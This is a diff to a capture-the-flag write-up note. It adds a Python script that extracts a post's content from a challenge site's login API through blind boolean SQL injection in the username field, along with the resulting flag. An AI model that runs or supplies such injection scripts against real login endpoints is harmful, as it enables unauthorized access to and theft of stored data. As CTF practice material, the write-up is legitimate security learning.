@@ -319,6 +319,9 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xv
 
 ![[IMG-20251205221651925.png]]
 
+![[IMG-20251205231633285.png]]
+
+
 ![[IMG-20251205221937938.png]]
 
 ![[IMG-20251205221625977.png]]
@@ -328,4 +331,39 @@ FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xv
 ```
 
 
+```python
+import requests
+
+url = "https://9iunt92zjij47u856z1jme0uy5974ar2-2025-12-02-tdu3-b60612.wannatry.fr/api/authenticate"
+
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!?.:;,+/()[]<>@#&%*$ "
+result = ""
+i = 1
+
+while True:
+    found = False
+    for c in chars:
+        payload = {
+            "username": f"' OR (SELECT substr(content,{i},1) FROM post WHERE id=5)='{c}' -- ",
+            "password": "x"
+        }
+
+        r = requests.post(url, json=payload)
+        j = r.json()
+
+        if j.get("error") == False:
+            result += c
+            print(f"{result}")
+            found = True
+            break
+
+
+    i += 1
+```
+
+![[IMG-20251205232138373.png]]
+
+```
+flag{http://home-2025-12-02-tdu3-b60612.wannatry.fr/3nwhe9e1bdq7lc7uqueo4kmcasizwvuw-end.html}   
+```
 
